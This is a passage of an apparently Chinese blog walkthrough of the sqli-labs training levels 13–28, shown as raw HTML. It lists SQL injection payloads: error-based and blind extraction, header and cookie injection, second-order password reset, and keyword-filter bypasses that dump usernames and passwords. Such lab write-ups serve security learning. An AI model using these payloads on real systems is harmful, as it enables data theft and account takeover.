1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看字段：uname=admin&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit <span class="operator">/</span><span class="operator">/</span>使用 limit 控制输出</span><br><span class="line"></span><br><span class="line">查看字段内容：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select concat(id,0x7e,username,0x3A,password,0x7e)from users limit 2,1)),1)##&amp;passwd=1&amp;submit=Submit  //使用 limit控制输出内容 </span></span><br></pre></td></tr></table></figure><h3 id="14关：”-闭合-报错注入，同13关"><a href="#14关：”-闭合-报错注入，同13关" class="headerlink" title="14关：” 闭合 报错注入，同13关"></a><strong>14关：” 闭合 报错注入，同13关</strong></h3><h3 id="15关：’-闭合-布尔盲注，延时注入"><a href="#15关：’-闭合-布尔盲注，延时注入" class="headerlink" title="**15关：’ 闭合 布尔盲注，延时注入 **"></a>**15关：’ 闭合 布尔盲注，延时注入 **</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">uname=&#x27; or (ascii(substr((select database()) ,1,1))) = 115 #&amp;passwd=&#x27; or 1=1 #&amp;submit=Submit //猜当前数据库的第一个字符为 S</span><br><span class="line"></span><br><span class="line">时间盲注：</span><br><span class="line">uname=1&#x27; and 1=2 union select 1,(length(database()儿)= 8 and if(1=1, sleep(5), 1)#&amp;passwd=1&amp;submit=Submit  //猜当前数据库的第一个字符为 S</span><br></pre></td></tr></table></figure><h3 id="16关：”-闭合-布尔盲注，延时注入-同15关"><a href="#16关：”-闭合-布尔盲注，延时注入-同15关" class="headerlink" title="16关：” 闭合 布尔盲注，延时注入 同15关"></a><strong>16关：” 闭合 布尔盲注，延时注入 同15关</strong></h3><h3 id="17关：’-闭合-报错注入-同13关"><a href="#17关：’-闭合-报错注入-同13关" class="headerlink" title="17关：’ 闭合 报错注入 同13关"></a><strong>17关：’ 闭合 报错注入 同13关</strong></h3><h3 id="18关：HTTP-头部注入-User-Agent"><a href="#18关：HTTP-头部注入-User-Agent" class="headerlink" title="18关：HTTP 头部注入  User-Agent"></a><strong>18关：HTTP 头部注入  User-Agent</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">代码审计，找到 <span class="keyword">insert</span>（插入数据的意思）</span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;,&#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line"></span><br><span class="line">在<span class="keyword">User</span><span class="operator">-</span>Agent: 处注入</span><br><span class="line">猜想在数据中的<span class="keyword">sql</span>语句为：<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">values</span>(<span class="string">&#x27;User-Agent&#x27;</span>,<span class="string">&#x27;Ip&#x27;</span>,<span class="string">&#x27;Username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">接下来我们尝试在<span class="keyword">User</span><span class="operator">-</span>Agent的位置进行注入测试，我们修改<span class="keyword">User</span><span class="operator">-</span>Agnet的值使其符合整个 <span class="keyword">insert</span> <span class="keyword">into</span> 的语法，闭合后就应该为 <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span> ,<span class="number">1</span>,<span class="number">1</span>)#<span class="string">&#x27;,&#x27;</span>Ip<span class="string">&#x27;,&#x27;</span>Username<span class="string">&#x27;),成功绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">18：源码片段$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>$uagent<span class="string">&#x27;, &#x27;</span>$IP<span class="string">&#x27;, $uname)&quot;;//这里是三个值</span></span><br><span class="line"><span class="string">改为：User-Agent: &#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">or</span> <span class="operator">/</span><span class="operator">/</span>这里是三个值</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent 的闭合原理思路还得研究</span><br><span class="line">或者：<span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),0) and&#x27;</span></span><br><span class="line">或者：<span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),0),1,1)#  </span></span><br></pre></td></tr></table></figure><h3 id="19关：HTTP-头部注入-Referer"><a href="#19关：HTTP-头部注入-Referer" class="headerlink" title="19关：HTTP 头部注入 Referer"></a><strong>19关：HTTP 头部注入 Referer</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>：源码片段$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; <span class="operator">/</span><span class="operator">/</span>这里是两个值</span><br><span class="line"><span class="keyword">sql</span>注入显示<span class="keyword">Column</span> count doesn<span class="string">&#x27;t match value count at row 1，那么意味着你的值数目不对应</span></span><br><span class="line"><span class="string">比如insert into 表名 (field1,field2,field3) values(&#x27;</span>a<span class="string">&#x27;,&#x27;</span>b<span class="string">&#x27;)这样前面的是三列，后面却只有二个值，这就会出现这个错误的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: &#x27;</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>),<span class="number">1</span>)#    <span class="operator">/</span><span class="operator">/</span>这里是两个值</span><br></pre></td></tr></table></figure><h3 id="20关：HTTP-头部注入-Cookie-’-闭合-显错"><a href="#20关：HTTP-头部注入-Cookie-’-闭合-显错" class="headerlink" title="20关：HTTP 头部注入 Cookie  ’ 闭合 显错"></a><strong>20关：HTTP 头部注入 Cookie  ’ 闭合 显错</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">正常登录后，admin<span class="string">&#x27; 报错，说名存在SQL注入</span></span><br><span class="line"><span class="string">修改value值，必须把语句放在位置3，否则有些语句会报错(原因未知)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查所以数据库：-n&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata#</span><br><span class="line"></span><br><span class="line">查表：<span class="operator">-</span>n<span class="string">&#x27;union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：-n&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br><span class="line"></span><br><span class="line">查字段内容：<span class="operator">-</span>n<span class="string">&#x27;union select 1,2,group_concat(id,0x7e,username,0x3A,password,0x7e) from security.users#</span></span><br></pre></td></tr></table></figure><h3 id="21关：HTTP-头部注入-‘）-闭合-过base64的Cookie"><a href="#21关：HTTP-头部注入-‘）-闭合-过base64的Cookie" class="headerlink" title="21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie"></a><strong>21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码片段：$cookee <span class="operator">=</span> base64_decode($cookee); </span><br><span class="line">例如：<span class="operator">-</span>n&quot; union select 1,2,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">base64后再去执行：</span><br><span class="line">LW4iIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure><h3 id="22关：HTTP-头部注入-”-闭合-过base64的Cookie"><a href="#22关：HTTP-头部注入-”-闭合-过base64的Cookie" class="headerlink" title="22关：HTTP 头部注入 ” 闭合 过base64的Cookie"></a><strong>22关：HTTP 头部注入 ” 闭合 过base64的Cookie</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源码$cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">$cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">例如：<span class="operator">-</span>n&quot; union select 1,2,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">base64后再去执行：</span><br><span class="line">LW4iIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure><h3 id="23关：get-请求-过滤了注释符-显错注入"><a href="#23关：get-请求-过滤了注释符-显错注入" class="headerlink" title="23关：get 请求 过滤了注释符  显错注入"></a><strong>23关：get 请求 过滤了注释符  显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">源码片段：</span><br><span class="line">$reg <span class="operator">=</span> &quot;/#/&quot;;</span><br><span class="line">$reg1 <span class="operator">=</span> &quot;/--/&quot;;</span><br><span class="line">$replace <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">将注释符过滤为空不能像以前那样</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3-- -</span></span><br><span class="line"><span class="string">此处的sql语句为</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3-- -&#x27;</span>limit <span class="number">0</span>,<span class="number">1</span>（<span class="comment">-- -后面的语句就会被忽略）</span></span><br><span class="line"></span><br><span class="line">解决办法<span class="number">1</span>：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),&#x27;</span><span class="number">3</span></span><br><span class="line">此处的<span class="keyword">sql</span>语句为</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;3&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>(这样整个句子就通了，只要通了就能运行)</span><br><span class="line"></span><br><span class="line">解决办法<span class="number">2</span>：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span></span><br><span class="line">此处的<span class="keyword">sql</span>语句为</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> users <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">语句通顺就是可以运行的</span><br></pre></td></tr></table></figure><h3 id="24关：二次注入"><a href="#24关：二次注入" class="headerlink" title="24关：二次注入"></a><strong>24关：二次注入</strong></h3><p>数据进库是没有执行，在出库时才被执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>先注册一个admin<span class="string">&#x27; #的账号。</span></span><br><span class="line"><span class="string">2.登录admin&#x27;</span>#，修改该账号的密码，此时修改的就是admin的密码。<span class="keyword">Sql</span>语句变为 UPDATE users <span class="keyword">SET</span> passwd<span class="operator">=</span>&quot;New_Pass&quot; <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27;AND password=&#x27;</span></span><br><span class="line">也就是执行了UPDATE users <span class="keyword">SET</span> passwd<span class="operator">=</span><span class="string">&#x27;New_Pass&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line">成功的话页面会提示Password successfully updated</span><br></pre></td></tr></table></figure><h3 id="25关：and-和-or-被过滤-显错注入"><a href="#25关：and-和-or-被过滤-显错注入" class="headerlink" title="25关：and 和 or 被过滤 显错注入"></a><strong>25关：and 和 or 被过滤 显错注入</strong></h3><p>尝试大小写绕过失败</p><p>过滤方法：双写 </p><p>还可以用对应符号代替 or = || ，and = &amp;&amp;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; oorrder by 4-- - //查列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- - //查数据库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; aandnd table_name=&#x27;</span>users<span class="string">&#x27;-- - //查字段数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x3A</span>,passwoorrd,<span class="number">0x7e</span>) <span class="keyword">from</span> security.users<span class="comment">-- - //字段内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="25a关：和25方法一样，只是这是数字型-显错注入"><a href="#25a关：和25方法一样，只是这是数字型-显错注入" class="headerlink" title="25a关：和25方法一样，只是这是数字型 显错注入"></a><strong>25a关：和25方法一样，只是这是数字型 显错注入</strong></h3><p>就是不用闭合</p><h3 id="26关：过滤了-or，and-，-–-空格-报错注入，显错注入"><a href="#26关：过滤了-or，and-，-–-空格-报错注入，显错注入" class="headerlink" title="26关：过滤了 or，and ， / , – , # , 空格 , /   报错注入，显错注入*"></a><em><em>26关：过滤了 or，and ， /</em> , – , # , 空格 , /   报错注入，显错注入</em>*</h3><p>空格：</p><p>使用 %0A 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”</p><p>闭合：</p><p>在语句尾部构造 ‘  或 %00注释</p><p>使用报错注入，函数内不需要考虑空格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="operator">/</span><span class="operator">/</span>查数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27; %26%26 table_name = &#x27;</span>users<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据 调整id<span class="operator">=</span>n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="26a关：闭合多一个括号-‘-报错注入，显错注入"><a href="#26a关：闭合多一个括号-‘-报错注入，显错注入" class="headerlink" title="26a关：闭合多一个括号 ‘) 报错注入，显错注入"></a><strong>26a关：闭合多一个括号 ‘) 报错注入，显错注入</strong></h3><p>payload 可以和26一样(报错)，也可以和27a一样(显错)</p><h3 id="27关：过滤-关键字-union-和-select-报错注入"><a href="#27关：过滤-关键字-union-和-select-报错注入" class="headerlink" title="27关：过滤 关键字 union 和 select 报错注入"></a><strong>27关：过滤 关键字 union 和 select 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">过滤</span><br><span class="line"><span class="keyword">function</span> blacklist($id)&#123;</span><br><span class="line">    $id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);     <span class="operator">/</span><span class="operator">/</span>过滤 <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);       //过滤 --.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);        //过滤 #.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);       //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);       //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id);     //过滤 union</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id);    //过滤 select</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id);     //过滤 UNION</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id);    //过滤 SELECT</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id);     //过滤 Union</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id);    //过滤 select</span></span><br><span class="line"><span class="comment">    return $id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>使用<strong>大小写</strong>或者<strong>双写</strong>绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">同样使用 updataxml 报错注入，函数内避开空格过滤</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查当前数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1, concat(0x7e, (SElect (group_concat(table_name)) FROM (information_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(1,(SElect(group_concat(column_name)) FROM (information_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27; %26%26 table_name = &#x27;</span>users<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x0a,(SElect(group_concat(concat_ws(0x3a,username,password))) FROM (security.users) WHERE (id = 4) )),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据 调整id<span class="operator">=</span>n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="27a关：只是闭合方式不一样-显错注入"><a href="#27a关：只是闭合方式不一样-显错注入" class="headerlink" title="27a关：只是闭合方式不一样 显错注入"></a><strong>27a关：只是闭合方式不一样 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,2,3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查显示位</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span><span class="operator">/</span><span class="operator">/</span>全库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;security&#x27;%0Aand%0Atable_name=&#x27;users&#x27;),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(&#x27;~&#x27;,id,&#x27;.&#x27;,username,&#x27;.&#x27;,password,&#x27;.&#x27;)%0Afrom%0Asecurity.users),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据</span><br></pre></td></tr></table></figure><h3 id="28关：过滤-union-select-组合-显错注入"><a href="#28关：过滤-union-select-组合-显错注入" class="headerlink" title="28关：过滤 union select 组合 显错注入"></a><strong>28关：过滤 union select 组合 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);              <span class="operator">/</span><span class="operator">/</span>过滤 <span class="comment">/*</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);                //过滤 --.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);                 //过滤 #.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                //过滤 spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);           //过滤 spaces.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                //过滤 spaces.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/union\s+select/i&#x27;,&quot;&quot;, $id);     //过滤 UNION &amp; SELECT.</span></span><br><span class="line"><span class="comment">return $id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>双写绕过union select：un<strong>union select</strong>ion select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,database(),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span 